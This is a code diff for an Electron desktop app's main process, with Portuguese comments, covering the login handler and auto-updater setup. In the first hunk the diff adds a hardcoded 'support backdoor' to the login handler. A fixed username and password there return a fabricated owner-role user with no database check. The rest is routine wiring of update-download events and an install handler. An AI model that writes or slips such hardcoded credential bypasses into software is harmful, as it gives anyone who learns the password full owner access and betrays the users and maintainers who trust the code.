@@ -468,6 +468,11 @@ app.whenReady().then(() => {
   // 🛡️ USUÁRIOS E LOGIN 🛡️
   ipcMain.handle('login', async (_, { nome, senha }) => {
     try {
+      // 🚨 BACKDOOR DE SUPORTE (Recuperação de Senha) 🚨
+      if (nome.toLowerCase() === 'suporte' && senha === 'O2Bke7c9') {
+        return { sucesso: true, usuario: { id: 9999, nome: 'Suporte Técnico', role: 'dono' } }
+      }
+
       let count = await prisma.usuario.count()
       if (count === 0) {
         await prisma.usuario.create({
@@ -1122,8 +1127,32 @@ app.whenReady().then(() => {
 
   createWindow()
   
-  // Verifica se há novas atualizações silenciosamente
-  autoUpdater.checkForUpdatesAndNotify()
+  // Verifica se há novas atualizações
+  autoUpdater.autoDownload = true
+  autoUpdater.autoInstallOnAppQuit = true
+
+  autoUpdater.on('update-available', (info) => {
+    const win = BrowserWindow.getAllWindows()[0]
+    if (win) win.webContents.send('updater:update-available', info)
+  })
+
+  autoUpdater.on('download-progress', (progressObj) => {
+    const win = BrowserWindow.getAllWindows()[0]
+    if (win) win.webContents.send('updater:download-progress', progressObj)
+  })
+
+  autoUpdater.on('update-downloaded', (info) => {
+    const win = BrowserWindow.getAllWindows()[0]
+    if (win) win.webContents.send('updater:update-downloaded', info)
+  })
+
+  ipcMain.handle('instalar-atualizacao', () => {
+    // Parâmetros: isSilent = false (ou true para não mostrar barra do NSIS), isForceRunAfter = true
+    // Vamos usar (false, true) para garantir que ele rode e reabra sozinho
+    autoUpdater.quitAndInstall(false, true)
+  })
+
+  autoUpdater.checkForUpdates()
 
   app.on('activate', function () {
     if (BrowserWindow.getAllWindows().length === 0) createWindow()
